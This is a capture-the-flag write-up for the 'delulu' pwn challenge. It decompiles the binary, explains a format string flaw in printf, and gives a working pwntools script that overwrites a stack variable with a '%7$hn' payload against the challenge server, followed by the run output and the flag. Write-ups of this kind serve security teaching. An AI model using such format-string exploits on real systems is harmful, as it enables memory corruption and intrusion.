solved by vulnx https://github.com/VulnX

chall files:

[pwn_delulu.zip](./pwn_delulu.zip)

# Analysis

On reversing with ghidra we get the following source:

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  long local_48;
  long *local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0x1337babe;
  local_40 = &local_48;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&local_38,0x1f);
  printf("\n[!] Checking.. ");
  printf((char *)&local_38);
  if (local_48 == 0x1337beef) {
    delulu();
  }
  else {
    error("ALERT ALERT ALERT ALERT\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
void delulu(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("You managed to deceive the robot, here\'s your new identity: ");
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Clearly we will get the flag if we call `delulu()`. That can be done if `local_48 == 0x1337beef`, however `local_48` is explicitly defined as `0x1337babe`. So obviously we need to partial overwrite the lower two bytes.

# Vulnerability

We have format string vulnerability in this line of code `printf((char *)&local_38);` . Since `local_38` is our input, we basically control the format specifier part of `printf()`. This gives us arbitrary read/write.

So we can use this to overwrite the lower 2 bytes of `local_48` but it requires us to have a pointer to `local_48` on the stack. Luckily that's done for us:

```c
local_48 = 0x1337babe;
local_40 = &local_48;
```

# Exploit

According to [64-bit calling convention]([Linux x64 Calling Convention: Stack Frame - Red Team Notes](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame)) in linux, the first 6 arguments to any function are passed via registers and the rest are passed via the stack. So the 7th arg (index 6) to printf is the first stack value and the 8th arg (index 7) is the second stack value.

If you attach a debugger and look at the stack before the call to printf, you will see that the stack somewhat looks like that:

```
+----------+
| local_48 | <-- RSP
|----------|
| local_40 |
|----------|
|    ...   |
```

Basically:

- 7th arg [ index 6 ] = local_48

- 8th arg [ index 7 ] = local_40 *(pointer to local_48)*

So we can write to `local_48` by using `local_40`

Here's the solve script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./delulu")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.250.218", 39766)

    return r


def main():
    r = conn()

    # good luck pwning :)
    r.sendline('%{}d%7$hn'.format(0xbeef).encode())
    r.recvuntil(b'{')
    flag = r.recvuntil(b'}')[:-1].decode()
    print(f'FLAG: HTB{{{flag}}}')


if __name__ == "__main__":
    main()
```

```console
$ python solve.py
[*] '/home/vulnx/Games/CTFs/Cyber Apocalypse/pwn/delulu/challenge/delulu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
[+] Opening connection to 83.136.250.218 on port 39766: Done
FLAG: HTB{m45t3r_0f_d3c3pt10n}
[*] Closed connection to 83.136.250.218 port 39766
```

# Flag

`HTB{m45t3r_0f_d3c3pt10n}`